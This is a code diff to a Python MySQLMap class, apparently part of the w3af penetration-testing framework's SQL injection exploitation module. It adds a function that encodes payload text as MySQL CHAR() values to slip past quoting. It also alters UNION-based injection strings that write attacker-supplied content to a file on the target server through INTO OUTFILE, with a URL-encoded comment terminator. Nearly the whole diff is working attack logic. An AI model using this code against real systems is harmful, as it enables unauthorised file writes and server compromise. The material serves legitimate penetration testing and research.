@@ -40,6 +40,13 @@ class MySQLMap(Common):
 
         return expression
 
+    def unescape_string(self, a_string):
+        ord_list = []
+        
+        for char in a_string:
+            ord_list.append( str(ord(char)) )
+
+        return 'CHAR(' + ','.join(ord_list) + ')'
 
     def createStm(self):
         if self.args.injectionMethod == "numeric":
@@ -496,19 +503,17 @@ class MySQLMap(Common):
         
         union = self.unionCheck()
         # union = http://localhost/w3af/blindSqli/blindSqli-integer.php?id=1 UNION SELECT NULL, NULL, NULL, NULL, NULL
-        
         if union == None:
             raise Exception('Failed to find a valid SQL UNION.')
         
         if self.args.injectionMethod == "numeric":
-            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' /*' % filename
+            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
         elif self.args.injectionMethod == "stringsingle":
             union = union.replace( "'1", 'NULL', 1 )
-            
-            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' /*' % filename
+            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' %%23' % filename
         elif self.args.injectionMethod == "stringdouble":
             union = union.replace( '"1', 'NULL', 1 )
-            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE "%s" /*' % filename
+            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE "%s" %%23' % filename
         
         # Now I'll basically create a list of union statements that are going to be sent to the
         # remote server. I create a list, because I REALLY WANT TO WRITE THE FILE, but I
@@ -520,9 +525,12 @@ class MySQLMap(Common):
         
         format_string_data = [ 'NULL' for i in xrange(number_of_nulls) ]
         
+        # Do some content mangling... and convert to CHAR(....)
+        content = self.unescape_string( content )
+        
         for position in xrange(number_of_nulls):
             tmp_format_string_data = format_string_data[:]
-            tmp_format_string_data[position] = "'" + content + "'"
+            tmp_format_string_data[position] = content
             
             crafted_union = union
             for string_format in xrange(union.count('%s')):
